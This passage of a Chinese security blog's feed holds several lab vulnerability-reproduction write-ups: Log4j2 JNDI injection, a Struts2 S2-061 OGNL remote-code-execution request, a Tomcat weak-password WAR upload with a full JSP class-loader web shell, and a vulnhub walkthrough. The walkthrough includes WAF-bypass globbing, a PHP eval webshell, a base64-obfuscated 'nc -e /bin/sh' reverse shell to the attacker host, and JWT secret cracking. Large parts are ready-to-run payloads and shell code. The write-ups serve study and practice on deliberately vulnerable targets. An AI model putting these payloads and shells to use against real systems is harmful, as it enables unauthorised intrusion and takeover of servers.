&#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>nc 监听<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131857057.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h1&gt;&lt;p&gt;CVE-2017-18349&lt;br&gt;fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set&amp;#x2F;get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。&lt;br&gt;根据官方给出的补丁文件，主要的更新在这个 checkAutoType 函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。&lt;/p&gt;
&lt;h1 id=&quot;复现环境&quot;&gt;&lt;a href=&quot;#复现环境&quot; class=&quot;headerlink&quot; title=&quot;复现环境&quot;&gt;&lt;/a&gt;复现环境&lt;/h1&gt;&lt;p&gt;vulhub项目 &lt;a href=&quot;https://vulhub.org/#/environments/fastjson/1.2.24-rce/&quot;&gt;https://vulhub.org/#/environments/fastjson/1.2.24-rce/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;Exploit&quot;&gt;&lt;a href=&quot;#Exploit&quot; class=&quot;headerlink&quot; title=&quot;Exploit&quot;&gt;&lt;/a&gt;Exploit&lt;/h1&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://syst1m.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="命令执行" scheme="https://syst1m.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="fastjson" scheme="https://syst1m.top/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>log4j2漏洞复现</title>
    <link href="https://syst1m.top/2022/06/12/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://syst1m.top/2022/06/12/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-06-12T09:09:11.000Z</published>
    <updated>2022-06-12T13:04:12.924Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>CVE-2021-44228<br>Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。<br>在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap:&#x2F;&#x2F;evil.com&#x2F;example}的lookup用于进行JNDI注入，执行任意代码。</p><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>Apache Log4j 2.x &lt; 2.15.0-rc2</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>用的是github上的一个docker环境:log4j_vuln</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.1 拉取漏洞环境镜像</span><br><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</span><br><span class="line">1.2 运行漏洞环境容器</span><br><span class="line">docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</span><br><span class="line">1.3 进入容器中</span><br><span class="line">docker <span class="built_in">exec</span> -it log4j_vuln_container /bin/bash</span><br><span class="line">1.4 启动漏洞环境</span><br><span class="line">/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh</span><br><span class="line">打开http://xxx.xxx.xxx.xxx:8080/webstudy/hello-fengxuan</span><br><span class="line">出现以下页面，说明搭建成功。</span><br></pre></td></tr></table></figure><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>访问url<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122023707.png"></p><h2 id="获取临时域名"><a href="#获取临时域名" class="headerlink" title="获取临时域名"></a>获取临时域名</h2><p>访问 <a href="http://dnslog.cn/">http://dnslog.cn/</a><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206121717449.png"></p><h2 id="dnslog执行代码"><a href="#dnslog执行代码" class="headerlink" title="dnslog执行代码"></a>dnslog执行代码</h2><p>构造payload</p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$&#123;<span class="attribute">jndi</span>:ldap://log4j2<span class="variable">.xxxxxx</span><span class="variable">.dnslog</span><span class="variable">.cn</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122026561.png"></p><p>查看dns平台已经执行成功<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122026083.png"></p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>在本地先要生成JNDI链接并启动后端相关服务，注意防火墙开启相关端口，用的是<a href="https://download.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip">JNDIExploit-1.2-SNAPSHOT.jar</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.20.146.195 -l 9999 -p 80</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122035772.png"></p><p>构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd: <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">c=<span class="variable">$&#123;jndi:ldap://10.20.146.195:9999/TomcatBypass/TomcatEcho&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122055177.png"></p><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>补丁链接:<br><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">log4j-2.15.0-rc2</a></p><ol><li><p>添加jvm启动参数-Dlog4j2.formatMsgNoLookups&#x3D;true；</p></li><li><p>在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups&#x3D;true；</p></li><li><p>JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;CVE-2021-44228&lt;br&gt;Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。&lt;br&gt;在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap:&amp;#x2F;&amp;#x2F;evil.com&amp;#x2F;example}的lookup用于进行JNDI注入，执行任意代码。&lt;/p&gt;
&lt;h1 id=&quot;影响范围&quot;&gt;&lt;a href=&quot;#影响范围&quot; class=&quot;headerlink&quot; title=&quot;影响范围&quot;&gt;&lt;/a&gt;影响范围&lt;/h1&gt;&lt;p&gt;Apache Log4j 2.x &amp;lt; 2.15.0-rc2&lt;/p&gt;
&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://syst1m.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="命令执行" scheme="https://syst1m.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="log4j2" scheme="https://syst1m.top/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2 S2-061漏洞复现</title>
    <link href="https://syst1m.top/2022/06/11/Struts2S2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://syst1m.top/2022/06/11/Struts2S2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-06-11T13:38:12.000Z</published>
    <updated>2022-06-12T13:05:12.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)<br>Struts2 会对某些标签属性(比如 <code>id</code>，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 <code>%&#123;x&#125;</code> 且 <code>x</code> 的值用户可控时，用户再传入一个 <code>%&#123;payload&#125;</code> 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。</p><p>影响范围:Apache Struts 2.0.0-2.5.25</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulhub项目地址 <a href="https://vulhub.org/#/environments/struts2/s2-061/">https://vulhub.org/#/environments/struts2/s2-061/</a></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="poc检测"><a href="#poc检测" class="headerlink" title="poc检测"></a>poc检测</h2><p>使用poc检测漏洞是否存在,需要使用url编码</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="symbol">%</span><span class="number">25</span>%7b+%27test%<span class="number">27</span>+%2b+(<span class="number">11</span>+<span class="symbol">%</span><span class="number">2b+11</span>).toString()%7d</span><br></pre></td></tr></table></figure><p>审查元素看到回显<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206121321542.png"></p><h2 id="exp利用"><a href="#exp利用" class="headerlink" title="exp利用"></a>exp利用</h2><p>发送下面数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>831</span><br><span class="line"></span><br><span class="line"><span class="language-clean">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span></span><br><span class="line"><span class="language-clean">Content-Disposition: form-data; name=<span class="string">&quot;id&quot;</span></span></span><br><span class="line"><span class="language-clean"></span></span><br><span class="line"><span class="language-clean">%&#123;(#instancemanager=#application[<span class="string">&quot;org.apache.tomcat.InstanceManager&quot;</span>]).(#stack=#attr[<span class="string">&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;</span>]).(#bean=#instancemanager.newInstance(<span class="string">&quot;org.apache.commons.collections.BeanMap&quot;</span>)).(#bean.setBean(#stack)).(#context=#bean.get(<span class="string">&quot;context&quot;</span>)).(#bean.setBean(#context)).(#macc=#bean.get(<span class="string">&quot;memberAccess&quot;</span>)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(<span class="string">&quot;java.util.HashSet&quot;</span>)).(#bean.put(<span class="string">&quot;excludedClasses&quot;</span>,#emptyset)).(#bean.put(<span class="string">&quot;excludedPackageNames&quot;</span>,#emptyset)).(#arglist=#instancemanager.newInstance(<span class="string">&quot;java.util.ArrayList&quot;</span>)).(#arglist.add(<span class="string">&quot;whoami&quot;</span>)).(#execute=#instancemanager.newInstance(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>)).(#execute.exec(#arglist))&#125;</span></span><br><span class="line"><span class="language-clean">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206121340388.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)&lt;br&gt;Struts2 会对某些标签属性(比如 &lt;code&gt;id&lt;/code&gt;，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 &lt;code&gt;%&amp;#123;x&amp;#125;&lt;/code&gt; 且 &lt;code&gt;x&lt;/code&gt; 的值用户可控时，用户再传入一个 &lt;code&gt;%&amp;#123;payload&amp;#125;&lt;/code&gt; 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。&lt;/p&gt;
&lt;p&gt;影响范围:Apache Struts 2.0.0-2.5.25&lt;/p&gt;
&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulhub项目地址 &lt;a href=&quot;https://vulhub.org/#/environments/struts2/s2-061/&quot;&gt;https://vulhub.org/#/environments/struts2/s2-061/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://syst1m.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Struts2" scheme="https://syst1m.top/tags/Struts2/"/>
    
    <category term="命令执行" scheme="https://syst1m.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat弱口令后台getshll复现</title>
    <link href="https://syst1m.top/2022/06/10/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%90%8E%E5%8F%B0getshll/"/>
    <id>https://syst1m.top/2022/06/10/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%90%8E%E5%8F%B0getshll/</id>
    <published>2022-06-10T07:36:45.000Z</published>
    <updated>2022-06-10T09:30:30.246Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulhub <a href="https://vulhub.org/#/environments/tomcat/tomcat8/">https://vulhub.org/#/environments/tomcat/tomcat8/</a></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206101540258.png"></p><p>弱密码登录后</p><p>将shell.jsp打包成shell.zip，在改后缀为shell.war上传</p><p>密码passwd</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206101552494.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206101558421.png"></p><p>连接url<br><a href="http://localhost:8080/shell/shell.jsp">http://localhost:8080/shell/shell.jsp</a><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206101555698.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulhub &lt;a href=&quot;https://vulhub.org/#/environments/tomcat/tomcat8/&quot;&gt;https://vulhub.org/#/environments/tomcat/tomcat8/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;Exploit&quot;&gt;&lt;a href=&quot;#Exploit&quot; class=&quot;headerlink&quot; title=&quot;Exploit&quot;&gt;&lt;/a&gt;Exploit&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206101540258.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;弱密码登录后&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://syst1m.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Tomcat" scheme="https://syst1m.top/tags/Tomcat/"/>
    
    <category term="弱口令" scheme="https://syst1m.top/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>红队渗透项目vulnhub-MinUv1打靶</title>
    <link href="https://syst1m.top/2022/06/09/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AEvulnhub-MinUv1%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/09/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AEvulnhub-MinUv1%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-09T02:58:27.000Z</published>
    <updated>2022-06-09T07:35:55.353Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机项目地址<a href="https://www.vulnhub.com/entry/minu-1,235/">https://www.vulnhub.com/entry/minu-1,235/</a><br>使用vm导入靶机需要关掉网卡2,再重新dhclinent</p><p>靶机:172.16.17.144</p><p>攻击机kali:172.16.17.140</p><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>拿到root下的flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091226745.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap收集"><a href="#nmap收集" class="headerlink" title="nmap收集"></a>nmap收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -sS -T5 172.16.17.144</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091107061.png"></p><p>中间件为Apache2.4.27,服务器为ubuntu</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091108873.png"><br>打开发现只有一个apache首页,丢到dirb爆破</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091110331.png"><br>几乎都是403,应该是有限制,要么是脚本要么是waf,继续加大力度爆破</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091133000.png"></p><p>发现一个test.php<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091137577.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>发现关键字,一般file&#x3D;xx可能会存在命令执行,文件包含,文件下载,文件读取等漏洞<br>尝试读取文件403,应该是存在waf<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091224040.png"></p><ul><li>尝试命令执行,成功回显<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091226943.png"><br>ls,cat等命令被拦截</li></ul><h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p>手工fuzz发现使用?或者*可以绕过waf,同样会被解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原payload  /bin/cat /ect/passwd</span><br><span class="line">绕过 /b?n/c?t /e?t/pa??wd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091257717.png"></p><h2 id="尝试写马失败"><a href="#尝试写马失败" class="headerlink" title="尝试写马失败"></a>尝试写马失败</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原payload</span><br><span class="line">/bin/echo <span class="built_in">echo</span>  <span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt;&#x27;</span>&gt;&gt;shell.php|/usr/bin/base64 -d|/bin/bash</span><br><span class="line"></span><br><span class="line">base64编码过后</span><br><span class="line">|/b?n/e?ho ZWNobyAgJzw/cGhwIEBldmFsKCRfUE9TVFsic2hlbGwiXSk7Pz4nPj5zaGVsbC5waHA=|/u?r/b?n/b?se64 -d|/b?n/b?sh</span><br></pre></td></tr></table></figure><p>在本地kali测试成功,但是在靶机上失败,不知道原因可能被waf拦截了<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091354331.png"></p><p>写马不行那就试试nc反弹</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>本地监听5555端口<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091418598.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原payload</span><br><span class="line">/bin/echo <span class="string">&quot;nc -e /bin/sh 172.16.17.140 5555&quot;</span> | /usr/bin/base64 -d| /bin/sh </span><br><span class="line"></span><br><span class="line">base64编码过后</span><br><span class="line">/b?n/e??o bmMgLWUgL2Jpbi9zaCAxNzIuMTYuMTcuMTQwIDU1NTUg|/?s?/b??/b??e64 -d|/b?n/sh </span><br></pre></td></tr></table></figure><p>需要注意的是,base64编码过后会出现&#x3D;或者&#x3D;&#x3D;,会被waf拦截,可以末尾添加空格</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091418922.png"></p><p>用python反弹一个交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br></pre></td></tr></table></figure><p>这里要注意的是,要根据靶机python变量来,可能是python可能是python3<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091421850.png"><br>找到线索<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091424098.png"></p><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>一开始以为是编码或者加密,没解出来,仔细看发现,是以<code>.</code>分割的三段字符串,标准的JWT</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI<span class="number">1</span><span class="symbol">NiIsInR5</span>cCI<span class="number">6</span>IkpX<span class="attr">VCJ9</span>.eyJzdWIiOiIxMj<span class="name">M0</span><span class="symbol">NTY3</span>ODkwIiwibmFtZSI<span class="number">6</span>Ikpva<span class="name">G4</span>gR<span class="name">G9</span>lIiwiaWF<span class="number">0</span>Ijox<span class="symbol">NTE2</span>Mj<span class="name">M5</span>MDIyfQ.p<span class="symbol">n55</span>j<span class="number">1</span>CFpcLjvReaqyJr<span class="number">0</span>BPEMYUsBdoDxEP<span class="meta">o6</span>Ft<span class="number">9</span>cwg</span><br></pre></td></tr></table></figure><p>JWT在线解析 <a href="https://jwt.io/#debugger-io">https://jwt.io/#debugger-io</a><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091431918.png"></p><p>前面两部分是base64编码,最后一部分需要秘钥</p><ul><li>使用工具爆破<br>项目地址 <a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c-jwt-cracker-master </span><br><span class="line">                                                                                                                                                                                                  </span><br><span class="line">apt-get install libssl-dev</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">./jwtcrack key</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091452825.png"></li></ul><p>等待几分钟爆出密码,根据最开始的提示应该是root密码</p><h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p>登录root<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206091456953.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶机项目地址&lt;a href=&quot;https://www.vulnhub.com/entry/minu-1,235/&quot;&gt;https://www.vulnhub.com/entry/minu-1,235/&lt;/a&gt;&lt;br&gt;使用vm导入靶机需要关掉网卡2,再重新dhclinent&lt;/p&gt;
&lt;p&gt;靶机:172.16.17.144&lt;/p&gt;
&lt;p&gt;攻击机kali:172.16.17.140&lt;/p&gt;
